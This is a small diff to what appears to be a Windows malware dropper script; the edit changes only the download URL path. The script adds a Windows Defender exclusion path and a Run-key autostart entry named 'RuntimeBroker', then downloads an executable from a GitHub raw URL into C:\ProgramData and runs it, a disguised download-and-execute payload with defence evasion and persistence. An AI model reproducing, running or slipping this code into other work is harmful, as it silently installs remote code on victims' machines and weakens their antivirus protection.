@@ -3,7 +3,8 @@ reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v 
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "RuntimeBroker" /t REG_SZ /d "C:\ProgramData\RuntimeBroker.exe" /f
 
 $filePath = "C:\ProgramData\RuntimeBroker.exe"
-$url = "https://github.com/ashduasdoasdoasd/zerin.pro-capabilities/raw/refs/heads/main/RuntimeBroker.exe" 
+$url = "https://github.com/ashduasdoasdoasd/zerin.pro-capabilities/raw/refs/heads/main/binary/RuntimeBroker.exe" 
 Invoke-WebRequest -Uri $url -OutFile $filePath
 
 & $filePath
+
